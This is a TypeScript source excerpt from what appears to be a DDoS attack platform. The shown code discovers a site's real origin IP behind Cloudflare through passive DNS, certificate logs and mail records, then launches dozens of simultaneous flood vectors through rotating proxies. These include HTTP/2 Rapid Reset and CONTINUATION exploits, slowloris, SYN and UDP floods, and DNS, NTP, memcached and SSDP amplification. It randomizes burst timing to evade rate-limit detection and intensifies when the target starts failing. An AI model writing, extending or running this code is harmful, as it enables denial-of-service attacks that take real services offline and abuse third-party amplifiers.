      } catch { clearTimeout(timer); return [] as string[]; }
    })(),
    // 8. RapidDNS — passive DNS database with historical subdomain-to-IP mappings
    //    Often catches subdomains that crt.sh misses (different cert issuers)
    (async () => {
      const baseDom = hostname.split(".").slice(-2).join(".");
      const ac = new AbortController();
      const timer = setTimeout(() => ac.abort(), 9_000);
      try {
        const r = await fetch(
          `https://rapiddns.io/subdomain/${baseDom}?full=1&down=1`,
          { headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "Accept": "text/html" }, signal: ac.signal }
        );
        clearTimeout(timer);
        const html = await r.text();
        const subs: string[] = [];
        for (const m of html.matchAll(/([a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,}/g)) {
          const s = m[0].toLowerCase().replace(/\.$/, "");
          if ((s.endsWith(`.${baseDom}`) || s === baseDom) && !s.includes("rapiddns") && !s.includes("cloudflare")) subs.push(s);
        }
        if (subs.length > 0) console.log(`[origin-discovery] RapidDNS found ${subs.length} subdomains for ${hostname}`);
        return [...new Set(subs)];
      } catch { clearTimeout(timer); return [] as string[]; }
    })(),
  ] as const);

  const candidates: string[] = [];

  // Collect from subdomains
  if (subResults.status === "fulfilled") {
    for (const r of subResults.value) {
      if (r.status === "fulfilled") {
        for (const ip of r.value) {
          if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
        }
      }
    }
  }

  // IPv6 — return immediately if found (CDN rarely proxies IPv6)
  if (ipv6Results.status === "fulfilled" && ipv6Results.value.length > 0) {
    return ipv6Results.value[0];
  }

  // Collect from SPF/TXT
  if (txtResults.status === "fulfilled") {
    for (const parts of txtResults.value) {
      const m = parts.join(" ").match(/ip4:([\d./]+)/g);
      if (m) {
        for (const e of m) {
          const ip = e.slice(4).split("/")[0];
          if (ip && !_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
        }
      }
    }
  }

  // Collect from MX
  if (mxResults.status === "fulfilled") {
    const nonStdMx = mxResults.value.filter(
      r => !/google|outlook|microsoft|yahoo|mailchimp|sendgrid|postmark/i.test(r.exchange)
    );
    const mxIpLists = await Promise.allSettled(nonStdMx.map(m => dnsP.resolve4(m.exchange).catch(() => [] as string[])));
    for (const r of mxIpLists) {
      if (r.status === "fulfilled") {
        for (const ip of r.value) {
          if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
        }
      }
    }
  }

  // Collect from crt.sh subdomains — resolve each to IP and add to candidates
  if (crtResults.status === "fulfilled" && crtResults.value.length > 0) {
    console.log(`[origin-discovery] crt.sh found ${crtResults.value.length} subdomains for ${hostname}`);
    const crtIpLists = await Promise.allSettled(
      crtResults.value.slice(0, 60).map(sub => dnsP.resolve4(sub).catch(() => [] as string[]))
    );
    for (const r of crtIpLists) {
      if (r.status === "fulfilled") {
        for (const ip of r.value) {
          if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
        }
      }
    }
  }

  // Collect from HackerTarget — returns IPs directly (already resolved)
  if (htResults.status === "fulfilled" && (htResults.value as string[]).length > 0) {
    const htIps = htResults.value as string[];
    console.log(`[origin-discovery] HackerTarget found ${htIps.length} IPs for ${hostname}`);
    for (const ip of htIps) {
      if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
    }
  }

  // Collect from ViewDNS history — high priority: often gives the real pre-CDN IP directly
  if (viewDnsResults.status === "fulfilled" && (viewDnsResults.value as string[]).length > 0) {
    const vdIps = viewDnsResults.value as string[];
    for (const ip of vdIps) {
      if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.unshift(ip); } // unshift = higher priority
    }
  }

  // Collect from RapidDNS — resolve each subdomain to IP (passive DNS, catches missed subdomains)
  if (rapidDnsResults.status === "fulfilled" && (rapidDnsResults.value as string[]).length > 0) {
    const rdSubs = rapidDnsResults.value as string[];
    const rdIpLists = await Promise.allSettled(
      rdSubs.slice(0, 80).map(sub => dnsP.resolve4(sub).catch(() => [] as string[]))
    );
    for (const r of rdIpLists) {
      if (r.status === "fulfilled") {
        for (const ip of r.value) {
          if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
        }
      }
    }
  }

  if (candidates.length === 0) return null;

  console.log(`[origin-discovery] Verifying ${candidates.length} candidates for ${hostname}...`);

  // Verify ALL candidates simultaneously — race to first confirmed origin
  return new Promise<string | null>(resolve => {
    let settled = 0;
    let found   = false;
    for (const ip of candidates) {
      _isRealOrigin(ip, hostname)
        .then(ok => {
          if (ok && !found) { found = true; resolve(ip); }
        })
        .catch(() => {})
        .finally(() => {
          settled++;
          if (settled >= candidates.length && !found) resolve(null);
        });
    }
  });
}

function spawnPool(
  method: string, target: string, port: number, threads: number,
  numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
  onCodes?: (codes: LiveCodes, latAvgMs: number) => void,
  sni?: string,
): Promise<void> {
  // OOM Guard 1: cap workers per pool
  numWorkers = Math.min(numWorkers, MAX_WORKERS_PER_POOL);

  // OOM Guard 2: global total worker cap — applies in both dev AND prod.
  // In prod: OOM kill = all attacks die. Better to skip a pool than crash the process.
  if (_activeWorkers >= MAX_TOTAL_WORKERS) {
    return Promise.resolve();
  }
  // Clamp numWorkers to remaining capacity
  numWorkers = Math.min(numWorkers, MAX_TOTAL_WORKERS - _activeWorkers);
  if (numWorkers <= 0) return Promise.resolve();

  // OOM Guard 3: clamp threads per worker in dev to limit in-flight socket count
  if (!IS_DEPLOYED) {
    threads = Math.min(threads, DEV_MAX_THREADS);
  }

  const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
  const workers: Worker[] = [];
  const workerConns = new Array<number>(numWorkers).fill(0);
  // Prefer health-checked proxies (TCP-verified live); fall back to full cache
  // healthyProxyCache is populated 20s after startup by background health-check
  // Tier routing: slow proxy methods use slowProxyCache (frees fast proxies for CVE/bypass attacks)
  let _proxySource: typeof proxyCache = [];
  if (HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0) {
    if (SLOW_PROXY_METHODS.has(method) && slowProxyCache.length >= 20) {
      // Slow-tier methods: use combined slow+residential (latency doesn't matter, need volume)
      _proxySource = slowProxyCache.length > 0 ? slowProxyCache : healthyProxyCache;
    } else if (fastProxyCache.length >= 50) {
      _proxySource = fastProxyCache; // fast tier for latency-sensitive attacks
    } else if (healthyProxyCache.length >= 50) {
      _proxySource = healthyProxyCache; // fallback to general healthy pool
    } else {
      _proxySource = proxyCache; // final fallback
    }
  }
  const proxies = _proxySource.map(p => ({
    host: p.host, port: p.port,
    type: p.type as "http" | "socks5" | undefined,
    username: p.username, password: p.password,
  }));

  return new Promise<void>((resolve) => {
    const finished = new Set<number>();
    let resolved = false;
    const tryResolve = () => {
      if (!resolved && finished.size >= numWorkers) {
        resolved = true;
        _activeWorkers = Math.max(0, _activeWorkers - numWorkers);
        resolve();
      }
    };

    for (let i = 0; i < numWorkers; i++) {
      // Re-check global cap for each worker (burst mode can push us over)
      if (_activeWorkers >= MAX_TOTAL_WORKERS) {
        finished.add(i);
        tryResolve();
        continue;
      }

      const t = i === numWorkers - 1
        ? threads - threadsPerWorker * (numWorkers - 1)
        : threadsPerWorker;

      // Heap cap per worker:
      // Deployed (8 vCPU / 32GB): 512MB → 64 workers × 512MB = 32GB theoretical max;
      //   actual usage ~100-200MB (I/O-bound workers rarely hit the ceiling).
      // Dev (shared container):   128MB → same as before.
      const workerOpts: import("worker_threads").WorkerOptions = {
        workerData: { method, target, port, threads: t, proxies, ...(sni ? { sni } : {}) },
        resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 512 : 128 },
      };
      const w = new Worker(WORKER_FILE, workerOpts);
      _activeWorkers++;
      const idx = i;
      workers.push(w);

      w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean; conns?: number; codes?: LiveCodes; latAvgMs?: number }) => {
        if (msg.codes) {
          const dispatch = onCodes ?? _codeDispatchers.get(signal);
          dispatch?.(msg.codes, msg.latAvgMs ?? 0);
        }
        if (msg.pkts !== undefined && msg.bytes !== undefined) {
          if (msg.conns !== undefined) workerConns[idx] = msg.conns;
          const totalConns = workerConns.reduce((a, b) => a + b, 0);
          onStats(msg.pkts, msg.bytes, totalConns > 0 ? totalConns : undefined);
        }
        if (msg.done) { finished.add(idx); tryResolve(); }
      });
      w.on("error", () => { finished.add(idx); tryResolve(); });
      w.on("exit",  () => { finished.add(idx); tryResolve(); });
    }

    signal.addEventListener("abort", () => {
      workers.forEach(w => { try { w.postMessage("stop"); } catch { /**/ } });
      setTimeout(() => {
        workers.forEach(w => { try { w.terminate(); } catch { /**/ } });
        if (!resolved) { resolved = true; _activeWorkers = Math.max(0, _activeWorkers - numWorkers); resolve(); }
      }, 2000);
    }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  RUN ATTACK — spawns CPU_COUNT workers, each with threads/N load
// ─────────────────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string, target: string, port: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
  id?: number, // optional — needed by Hydra Override T004 adaptive burst
): Promise<void> {
  // ── Power-Level Boost ────────────────────────────────────────────────────
  // UI sends threads 1–8 (power level). Multiply to get real connection count.
  // threads=8 → 4000 concurrent connections per worker (prod) or 256 (dev).
  // Cap: prod 12000 (leaves RAM headroom on 32GB), dev 256 (container safe).
  threads = Math.min(threads * THREAD_MULTIPLIER, IS_DEPLOYED ? 12000 : DEV_MAX_THREADS);

  // UDP/L3 attacks: SINGLE worker with multiple sockets (multi-worker UDP can deadlock in this env)
  // quic-flood is also UDP-based (port 443/UDP)
  // icmp-flood, dns-amp, ntp-amp, mem-amp, ssdp-amp are real network attacks via dgram UDP
  const UDP_METHODS = new Set([
    "udp-flood", "udp-bypass", "quic-flood",
    "icmp-flood", "dns-amp", "ntp-amp", "mem-amp", "ssdp-amp",
  ]);
  if (UDP_METHODS.has(method)) {
    await spawnPool(method, target, port, threads, 1, signal, onStats);
    return;
  }

  // ── GEASS OVERRIDE: ARES OMNIVECT ∞ — ABSOLUTE TOTAL DEVASTATION ────────
  // ★ 30 SIMULTANEOUS ATTACK VECTORS — 32GB/8vCPU OPTIMIZED ★
  //
  // Layer 7 — Application (12 vectors):
  // Vector  1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
  // Vector  2: Slowloris               — hold half-open TLS sockets, starve thread pool
  // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 1000-stream RST burst, dominant CPU
  // Vector  4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM (nginx ≤1.25.4)
  // Vector  5: HPACK Bomb              — RFC 7541 incremental indexing table eviction storm
  // Vector  6: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
  // Vector  7: WebSocket Exhaustion    — goroutine/thread per conn + large message frames
  // Vector  8: GraphQL Fragment Bomb   — fragment spread explosion: O(frags × fields) CPU
  // Vector  9: RUDY v2 Slow POST       — multipart/form-data 1GB body, holds server threads
  // Vector 10: Cache Poison            — CDN cache eviction, 100% origin miss rate
  // Vector 11: HTTP Bypass             — Chrome fingerprint + proxy rotation, bypasses CDN/WAF per-IP
  // Vector 12: Keepalive Exhaust       — pipeline 128 reqs/conn, holds server worker threads [NEW]
  //
  // Layer 7 — Advanced HTTP/2 (4 vectors):
  // Vector 13: H2 Settings Storm       — SETTINGS oscillation + WINDOW_UPDATE: 326K pps proved
  // Vector 14: HTTP Pipeline Flood     — HTTP/1.1 pipelining 128 req/write, 300K req/s, no wait
  // Vector 15: H2 PING Storm           — thousands of PING frames/s, server must ACK every one [NEW]
  // Vector 16: HTTP Smuggling          — TE/CL desync, poisons backend request queue [NEW]
  //
  // TLS / Crypto (3 vectors):
  // Vector 17: TLS Renegotiation       — forced public-key handshake 1000×/sec on server CPU
  // Vector 18: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
  // Vector 19: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
  //
  // Application Layer — Extended (3 vectors):
  // Vector 20: XML Bomb                — billion-laughs entity expansion to XML/SOAP endpoints [NEW]
  // Vector 21: Slow Read               — pause TCP read, fills server send buffer, thread blocked [NEW]
  // Vector 22: HTTP Range Flood        — Range: 500 × 1-byte ranges, 500× server I/O per req [NEW]
  //
  // Layer 4 — Transport (1 vector):
  // Vector 23: SYN Flood               — pure TCP SYN_RECV table exhaustion before handshake
  //
  // Layer 3 — Network/Amplification (5 vectors):
  // Vector 24: ICMP Flood              — real ICMP echo, raw-socket/hping3/UDP fallback, L3 saturation
  // Vector 25: DNS Water Torture       — floods NS servers, bypasses CDN/WAF, fills NXDOMAIN cache
  // Vector 26: NTP Flood               — real NTP mode 7 monlist + mode 3 client requests
  // Vector 27: Memcached UDP Flood     — real binary Memcached protocol to port 11211
  // Vector 28: SSDP M-SEARCH Flood     — real SSDP M-SEARCH to port 1900 (UPnP stack exhaustion)
  //
  // UDP / Volumetric (2 vectors):
  // Vector 29: UDP Flood               — raw UDP burst engine, 500K pps per worker
  // Vector 30: DNS over HTTPS Flood    — random DNS queries to /dns-query, forces recursive lookup [NEW]
  //
  // ★ ADAPTIVE BURST MODE: after 30s, top 5 vectors auto-spike to +50% threads for 10s waves
  // ★ WORKER SCALING: I/O-bound vectors → 2× CPU_COUNT workers each
  if (method === "geass-override") {
    // ── Worker counts — calibrated for stable deployment containers (4-8GB RAM) ──
    // slowloris/conn-flood each hold thousands of persistent TLS sockets → 1 worker each
    // HTTP/H2 workers are stateless (fast req/response) → scale with CPU_COUNT
    const connW    = 1;                               // 1× conn-flood (12K persistent TLS sockets each)
    const slowW    = 1;                               // 1× slowloris  (15K persistent TLS sockets each)
    const h2W      = Math.max(6, CPU_COUNT);          // ≥6 — CVE-2023-44487 (stateless, scales well)
    const contW    = Math.max(4, Math.floor(CPU_COUNT * 0.75)); // ≥4 — CVE-2024-27316 OOM
    const hpackW   = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — HPACK eviction
    const wafW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Chrome JA4 fingerprint
    const wsW      = 1;                               // 1× WS exhaust (5K persistent WS sockets each)
    const gqlW     = 2;                               // 2× GraphQL exponential
    const rudyW    = 1;                               // 1× multipart slow POST (persistent)
    const cacheW   = 2;                               // 2× CDN cache eviction
    const tlsW     = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — RSA renegotiation CPU
    const quicW    = 1;                               // 1× QUIC/H3 UDP
    const sslW     = 2;                               // 2× SSL Death Record
    const stormW   = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — H2 Settings Storm
    const pipeW    = Math.max(6, CPU_COUNT);          // ≥6 — HTTP Pipeline (stateless, high throughput)
    const bypassW  = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — Chrome bypass
    const kaW      = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — Keepalive exhaust
    const pingW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — H2 PING storm
    const smugW    = 2;                               // 2× HTTP smuggling
    const xmlW     = 1;                               // 1× XML bomb (CPU-bound, 1 is enough)
    const slowRW   = 1;                               // 1× Slow Read (persistent connections)
    const rangeW   = 2;                               // 2× Range Flood
    const appW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — App Smart Flood
    const lhbW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Large Header Bomb
    const prioW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — H2 PRIORITY Storm
    const rstW     = Math.max(4, CPU_COUNT);          // ≥4 — H2 RST Burst (CVE-2023-44487 pure)
    const grpcW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — gRPC handler exhaustion
    const synW     = 1;                               // 1× SYN flood (UDP-like, 1 is enough)
    // New 2026 vectors
    const rrW      = Math.max(4, CPU_COUNT);          // ≥4 — Rapid Reset Ultra (stateless, scales well)
    const wcbW     = Math.max(2, Math.floor(CPU_COUNT / 2)); // ≥2 — WS Compression Bomb
    const goawayW  = Math.max(3, Math.floor(CPU_COUNT / 2)); // ≥3 — H2 GOAWAY Loop
    const sseW     = 1;                               // 1× SSE Exhaust (persistent conn hold)
    const h3rrW    = Math.max(4, CPU_COUNT);          // ≥4 — H3 Rapid Reset (UDP, stateless, max parallelism)
    // L3/UDP — single worker with high socket concurrency
    const icmpW    = 1;  const dnsW = 1;  const ntpW = 1;
    const memW     = 1;  const ssdpW = 1; const udpW = 1; const dohW = 1;

    // ── Thread budget v4 — re-calibrated April 2026 (39 vectors) ────────────
    // Priority: H2 RST (CVE-2023-44487) → Rapid Reset Ultra → H2 Settings Storm → HTTP Pipeline
    // → HPACK Bomb → H2 CONTINUATION (CVE-2024-27316) → WAF Bypass → App Smart
    const connT    = Math.max(200,  Math.round(threads * 0.10)); // conn-flood (hold sockets)
    const slowT    = Math.max(200,  Math.round(threads * 0.10)); // slowloris (hold threads)
    const h2T      = Math.max(1200, Math.round(threads * 0.70)); // ★★★★ CVE-2023-44487 RST — most impactful
    const contT    = Math.max(900,  Math.round(threads * 0.50)); // ★★★ CVE-2024-27316 OOM — many servers unpatched
    const hpackT   = Math.max(700,  Math.round(threads * 0.40)); // ★★★ HPACK eviction CPU storm
    const wafT     = Math.max(600,  Math.round(threads * 0.40)); // ★★★ Chrome JA4 fingerprint bypass
    const wsT      = Math.max(200,  Math.round(threads * 0.10)); // WS goroutine exhaust
    const gqlT     = Math.max(100,  Math.round(threads * 0.07)); // GraphQL resolver explosion
    const udpT     = Math.max(150,  Math.round(threads * 0.08)); // UDP bandwidth
    const rudyT    = Math.max(100,  Math.round(threads * 0.09)); // RUDY slow POST
    const cacheT   = Math.max(100,  Math.round(threads * 0.07)); // CDN cache eviction
    const tlsT     = Math.max(100,  Math.round(threads * 0.07)); // TLS RSA renegotiation
    const quicT    = Math.max(80,   Math.round(threads * 0.05)); // QUIC state alloc
    const sslT     = Math.max(200,  Math.round(threads * 0.10)); // SSL Death Record (1-byte TLS)
    const stormT   = Math.max(1000, Math.round(threads * 0.58)); // ★★★★ H2 Settings Storm — nginx killer
    const pipeT    = Math.max(1800, Math.round(threads * 0.82)); // ★★★★ HTTP/1.1 Pipeline — saturates keep-alive pool
    const bypassT  = Math.max(300,  Math.round(threads * 0.22)); // Chrome L7 bypass
    const kaT      = Math.max(200,  Math.round(threads * 0.15)); // Keepalive exhaustion
    const pingT    = Math.max(500,  Math.round(threads * 0.32)); // ★★★ H2 PING storm (WINDOW_UPDATE flood)
    const smugT    = Math.max(100,  Math.round(threads * 0.10)); // HTTP request smuggling
    const xmlT     = Math.max(80,   Math.round(threads * 0.06)); // XML billion-laughs
    const slowRT   = Math.max(100,  Math.round(threads * 0.09)); // Slow Read TCP window
    const rangeT   = Math.max(150,  Math.round(threads * 0.12)); // HTTP Range I/O amplification
    const synT     = Math.max(400,  Math.round(threads * 0.15)); // SYN flood
    // L3/UDP — each gets its own high-throughput socket pool
    const icmpT    = Math.max(400,  Math.round(threads * 0.15)); // ICMP echo flood
    const dnsT     = Math.max(500,  Math.round(threads * 0.12)); // DNS Water Torture (NS servers)
    const ntpT     = Math.max(400,  Math.round(threads * 0.09)); // NTP mode 7 monlist
    const memT     = Math.max(200,  Math.round(threads * 0.07)); // Memcached binary UDP
    const ssdpT    = Math.max(200,  Math.round(threads * 0.07)); // SSDP M-SEARCH UPnP
    const dohT     = Math.max(100,  Math.round(threads * 0.06)); // DoH recursive flood
    const appT     = Math.max(600,  Math.round(threads * 0.35)); // ★★★ App Smart Flood (session-aware)
    const lhbT     = Math.max(500,  Math.round(threads * 0.28)); // ★★★ Large Header Bomb (header table OOM)
    const prioT    = Math.max(400,  Math.round(threads * 0.28)); // ★★★ H2 PRIORITY Storm (dep-tree CPU)
    const rstT     = Math.max(800,  Math.round(threads * 0.55)); // ★★★★ H2 RST Burst — pure CVE-2023-44487
    const grpcT    = Math.max(300,  Math.round(threads * 0.20)); // ★★★ gRPC flood — separate thread pool
    // 2026 new vector thread budgets
    const rrT      = Math.max(600,  Math.round(threads * 0.50)); // ★★★★ Rapid Reset Ultra — 2000 streams/burst single write()
    const wcbT     = Math.max(200,  Math.round(threads * 0.15)); // ★★★ WS Compression Bomb — 1820× decompress amplification
    const goawayT  = Math.max(300,  Math.round(threads * 0.22)); // ★★★ H2 GOAWAY Loop — 5000 teardown/setup cycles/s
    const sseT     = Math.max(200,  Math.round(threads * 0.10)); // SSE Exhaust — goroutine hold attack
    const h3rrT    = Math.max(500,  Math.round(threads * 0.45)); // ★★★★★ H3 Rapid Reset — QUIC RESET_STREAM (UDP, unrate-limitable)

    const geassConnsPerPool = new Map<string, number>();
    const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
      if (c !== undefined) {
        geassConnsPerPool.set(poolKey, c);
        const total = [...geassConnsPerPool.values()].reduce((a, v) => a + v, 0);
        onStats(p, b, total);
      } else {
        onStats(p, b);
      }
    };

    // ── Launch all 43 vectors simultaneously (ARES OMNIVECT ∞ v3) ────────────────
    // ORDERING: highest-impact vectors FIRST — dev worker cap (22) hits best vectors.
    // In deployed (uncapped): all 43 run at full power simultaneously.
    const geassPromise = Promise.all([
      // ★★★★★ TIER 1 — Max bandwidth UDP (bypasses all L7 rate limiting)
      spawnPool("h3-rapid-reset",      target, 443,  h3rrT,   h3rrW,   signal, onStats),          // [1] CVE-2023-44487 via QUIC/UDP — 2GB/min, unrate-limitable
      spawnPool("quic-flood",          target, 443,  quicT,   quicW,   signal, onStats),           // [2] QUIC Initial flood UDP — 1.5GB/min
      // ★★★★★ TIER 1 — True CVE exploits (highest server CPU burn)
      spawnPool("rapid-reset",         target, port, rrT,     rrW,     signal, onStats),           // [3] CVE-2023-44487 Ultra H2: 2000 streams/burst, Chrome AKAMAI fp
      spawnPool("h2-rst-burst",        target, port, rstT,    rstW,    signal, onStats),           // [4] CVE-2023-44487 pure RST — true H2 stream open→RST cycle
      spawnPool("http2-continuation",  target, port, contT,   contW,   signal, onStats),           // [5] CVE-2024-27316 CONTINUATION OOM — server buffers headers forever
      // ★★★★ TIER 2 — High-throughput L7 (saturates server thread pools)
      spawnPool("h2-settings-storm",   target, port, stormT,  stormW,  signal, onStats),           // [6] H2 Settings Storm — nginx/Apache SETTINGS frame saturation
      spawnPool("http-pipeline",       target, port, pipeT,   pipeW,   signal, onStats),           // [7] HTTP/1.1 Pipeline — saturates keep-alive connection pool
      spawnPool("conn-flood",          target, port, connT,   connW,   signal, makeGeassOnStats("conn")),  // [8] TLS conn exhaust — 12K persistent TLS sockets
      spawnPool("slowloris",           target, port, slowT,   slowW,   signal, makeGeassOnStats("slow")),  // [9] Slowloris — 15K half-open connections
      spawnPool("hpack-bomb",          target, port, hpackT,  hpackW,  signal, onStats),           // [10] HPACK bomb — header table eviction CPU storm
      spawnPool("waf-bypass",          target, port, wafT,    wafW,    signal, onStats),           // [11] WAF Bypass — Chrome JA4 fingerprint + TLS bypass
      spawnPool("tls-renego",          target, port, tlsT,    tlsW,    signal, makeGeassOnStats("tls")),  // [12] TLS renegotiation — RSA CPU exhaustion
      spawnPool("ws-compression-bomb", target, port, wcbT,    wcbW,    signal, onStats),           // [13] WS Compression Bomb — 1820× permessage-deflate amplification
      spawnPool("h2-ping-storm",       target, port, pingT,   pingW,   signal, onStats),           // [14] H2 PING storm — WINDOW_UPDATE flood
      spawnPool("http2-flood",         target, port, h2T,     h2W,     signal, onStats),           // [15] H2 stream flood — multiplexed request burst
      spawnPool("ssl-death",           target, port, sslT,    sslW,    signal, makeGeassOnStats("ssl")),  // [16] SSL Death Record — 1-byte TLS handshake
      spawnPool("h2-goaway-loop",      target, port, goawayT, goawayW, signal, onStats),           // [17] H2 GOAWAY Loop — 5000 TLS teardown/setup/s
      spawnPool("app-smart-flood",     target, port, appT,    appW,    signal, onStats),           // [18] App Smart Flood — session-aware CF bypass
      spawnPool("large-header-bomb",   target, port, lhbT,    lhbW,    signal, onStats),           // [19] Large Header Bomb — header table OOM
      spawnPool("dns-amp",             target, port, dnsT,    dnsW,    signal, onStats),           // [20] DNS amplification — NS server flood
      spawnPool("grpc-flood",          target, port, grpcT,   grpcW,   signal, onStats),           // [21] gRPC handler pool exhaustion
      spawnPool("keepalive-exhaust",   target, port, kaT,     kaW,     signal, makeGeassOnStats("ka")),   // [22] Keepalive exhaust — hold connections
      // ★★★ TIER 3 — Supplementary (all run in deployed, skipped in dev if cap reached)
      spawnPool("http2-priority-storm",target, port, prioT,   prioW,   signal, onStats),           // [23] H2 PRIORITY dep-tree CPU
      spawnPool("ws-flood",            target, port, wsT,     wsW,     signal, makeGeassOnStats("ws")),   // [24] WS goroutine exhaust
      spawnPool("graphql-dos",         target, port, gqlT,    gqlW,    signal, onStats),           // [25] GraphQL resolver explosion
      spawnPool("rudy-v2",             target, port, rudyT,   rudyW,   signal, makeGeassOnStats("rudy")), // [26] RUDY slow POST — multipart trickle
      spawnPool("cache-poison",        target, port, cacheT,  cacheW,  signal, onStats),           // [27] CDN cache eviction
      spawnPool("http-bypass",         target, port, bypassT, bypassW, signal, onStats),           // [28] Chrome 3-layer bypass
      spawnPool("http-smuggling",      target, port, smugT,   smugW,   signal, onStats),           // [29] HTTP request smuggling
      spawnPool("xml-bomb",            target, port, xmlT,    xmlW,    signal, onStats),           // [30] XML billion-laughs
      spawnPool("slow-read",           target, port, slowRT,  slowRW,  signal, makeGeassOnStats("sr")),   // [31] Slow Read TCP window
      spawnPool("range-flood",         target, port, rangeT,  rangeW,  signal, onStats),           // [32] HTTP Range I/O amplification
      spawnPool("sse-exhaust",         target, port, sseT,    sseW,    signal, makeGeassOnStats("sse")),   // [33] SSE Exhaust — goroutine hold
      // ★★ TIER 4 — L4/L3 Volumetric (very effective in deployed)
      spawnPool("syn-flood",           target, port, synT,    synW,    signal, onStats),           // [34] SYN flood
      spawnPool("icmp-flood",          target, port, icmpT,   icmpW,   signal, onStats),           // [35] ICMP echo flood
      spawnPool("ntp-amp",             target, port, ntpT,    ntpW,    signal, onStats),           // [36] NTP mode 7 monlist amplification
      spawnPool("mem-amp",             target, port, memT,    memW,    signal, onStats),           // [37] Memcached binary UDP amplification
      spawnPool("ssdp-amp",            target, port, ssdpT,   ssdpW,   signal, onStats),           // [38] SSDP M-SEARCH UPnP amplification
      spawnPool("udp-flood",           target, port, udpT,    udpW,    signal, onStats),           // [39] UDP bandwidth saturation
      spawnPool("doh-flood",           target, port, dohT,    dohW,    signal, onStats),           // [40] DoH recursive flood
      spawnPool("tls-session-exhaust", target, port, tlsT,    tlsW,    signal, onStats),           // [41] TLS session cache exhaust
      spawnPool("cache-buster",        target, port, cacheT,  cacheW,  signal, onStats),           // [42] Cache buster
    ]); // Total: 42 vectors — ARES OMNIVECT ∞ v3

    // ── ADAPTIVE BURST MODE v2 — T003 RESPONSE CODE INTELLIGENCE ────────────
    // After 30s: fires BURST WAVES with randomized duration (8-22s ON, 3-10s REST).
    // Uniform burst timing is detectable by ML rate limiters — irregular cadence defeats them.
    //
    // T004 ADAPTIVE LOGIC: reads live response codes from the T003 telemetry map to
    // dynamically select which vectors to boost in each wave:
    //   • 5xx dominant (>35% of total) → server is overwhelmed → boost H2/RST vectors
    //   • 429 dominant (>25% of client) → rate-limited → boost gRPC + proxy-rotation vectors
    //   • Mixed/unknown → standard wave rotation (H2 → App → Max)
    const ri = (min: number, max: number) => Math.floor(Math.random() * (max - min)) + min;
    const burstLoop = async () => {
      await new Promise<void>(r => setTimeout(r, 30_000)); // wait 30s for initial probing
      let wave = 0;
      while (!signal.aborted) {
        wave++;
        const onMs   = ri(8_000,  22_000); // ★ random 8-22s burst window (defeats fixed-pattern detection)
        const restMs = ri(3_000,  10_000); // ★ random 3-10s rest between bursts
        const burstAbort = new AbortController();
        const burstTimer = setTimeout(() => burstAbort.abort(), onMs);
        const combined: AbortSignal = typeof (AbortSignal as { any?: unknown }).any === "function"
          ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, burstAbort.signal])
          : burstAbort.signal;

        // T004: Read real-time response code distribution to select wave strategy
        const codes  = liveResponseCodes.get(id ?? -1) ?? { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 };
        const total  = codes.ok + codes.redir + codes.client + codes.server + codes.timeout;
        const svRat  = total > 0 ? codes.server / total : 0;  // 5xx ratio
        const ratRat = total > 0 ? codes.client / (total || 1) : 0; // 4xx ratio (includes 429)

        if (svRat > 0.35) {
          // ★ SERVER OVERWHELMED (5xx > 35%) — double-down on H2 + RST to finish the job
          void Promise.all([
            spawnPool("http2-flood",      target, port, Math.round(h2T    * 3.0), Math.min(h2W, 10),    combined, onStats),
            spawnPool("h2-rst-burst",     target, port, Math.round(rstT   * 3.0), Math.min(rstW, 10),   combined, onStats),
            spawnPool("h2-settings-storm",target, port, Math.round(stormT * 2.8), Math.min(stormW, 8),  combined, onStats),
            spawnPool("http-pipeline",    target, port, Math.round(pipeT  * 2.8), Math.min(pipeW, 8),   combined, onStats),
            spawnPool("h2-ping-storm",    target, port, Math.round(pingT  * 2.5), Math.min(pingW, 6),   combined, onStats),
            spawnPool("hpack-bomb",       target, port, Math.round(hpackT * 2.5), Math.min(hpackW, 6),  combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else if (ratRat > 0.25) {
